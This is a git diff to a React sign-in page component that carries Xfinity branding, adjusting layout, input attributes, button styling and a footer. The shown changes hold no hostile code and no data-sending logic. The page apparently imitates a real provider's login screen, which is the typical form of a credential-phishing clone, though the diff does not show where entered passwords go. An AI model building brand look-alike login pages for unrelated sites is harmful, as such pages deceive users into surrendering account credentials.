@@ -1,6 +1,8 @@
 import { useState } from "react";
 import { Link, useLocation, useNavigate } from "react-router-dom";
 import { Eye, EyeOff, LoaderCircle } from "lucide-react";
+import Logo from "@/assets/xfinity-logo-grey.svg";
+import Footer from "@/components/Footer/Footer";
 
 const LoginPassword = () => {
   const location = useLocation();
@@ -32,8 +34,9 @@ const LoginPassword = () => {
   };
 
   return (
-    <main className="flex min-h-screen items-center justify-center bg-background px-6 py-16">
-      <div className="w-full max-w-xl space-y-7 border border-red-700 translate-y-[28px]">
+    <main className="h-screen overflow-y-auto bg-background">
+          <section className="h-[95vh] flex items-center justify-center px-6">
+                  <div className="w-full max-w-xl space-y-7 mt-28">
          
     {/* Logo */}
     <img
@@ -52,9 +55,10 @@ const LoginPassword = () => {
           <div className="relative">
             <input
               type={showPassword ? "text" : "password"}
-              placeholder="Password"
+              placeholder=""
               value={password}
               onChange={(e) => { setPassword(e.target.value); setError(""); }}
+              required
               className="w-full rounded-sm border border-neutral-500 bg-neutral-100 px-4 py-4 pr-12 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
             />
             <button
@@ -79,6 +83,7 @@ const LoginPassword = () => {
               type="checkbox"
               checked={keepSignedIn}
               onChange={(e) => setKeepSignedIn(e.target.checked)}
+              required
               className="h-6 w-6 rounded border-border accent-xfinity-purple"
             />
             Keep me signed in
@@ -100,7 +105,7 @@ const LoginPassword = () => {
             type="submit"
             disabled={loading}
             aria-busy={loading}
-            className="group relative inline-flex h-12 w-full items-center justify-center overflow-hidden rounded-lg bg-xfinity-purple px-4 font-semibold leading-none text-primary-foreground transition-all duration-300 ease-out hover:-translate-y-0.5 hover:bg-xfinity-purple-hover hover:shadow-md active:translate-y-0 active:scale-[0.99] disabled:cursor-not-allowed disabled:hover:translate-y-0 disabled:hover:shadow-none disabled:opacity-60"
+            className="group relative block h-12 w-28 items-center justify-center overflow-hidden rounded-sm bg-xfinity-purple px-4 font-semibold leading-none text-primary-foreground transition-all duration-300 ease-out hover:-translate-y-0.5 hover:bg-xfinity-purple-hover hover:shadow-md active:translate-y-0 active:scale-[0.99] disabled:cursor-not-allowed disabled:hover:translate-y-0 disabled:hover:shadow-none disabled:opacity-60"
           >
             <span
               aria-hidden="true"
@@ -110,7 +115,7 @@ const LoginPassword = () => {
               {loading ? (
                 <>
                   <LoaderCircle className="h-4 w-4 flex-shrink-0 animate-spin" />
-                  <span>Signing in…</span>
+                  {/* <span>Signing in…</span> */}
                 </>
               ) : (
                 <span className="transition-transform duration-300 group-hover:scale-[1.02]">Sign in</span>
@@ -130,6 +135,13 @@ const LoginPassword = () => {
       </p>
         </form>
       </div>
+
+          </section>
+
+{/* FOOTER (only shows when scrolling) */}
+    <footer className="bg-white">
+      <Footer />
+    </footer>
     </main>
   );
 };
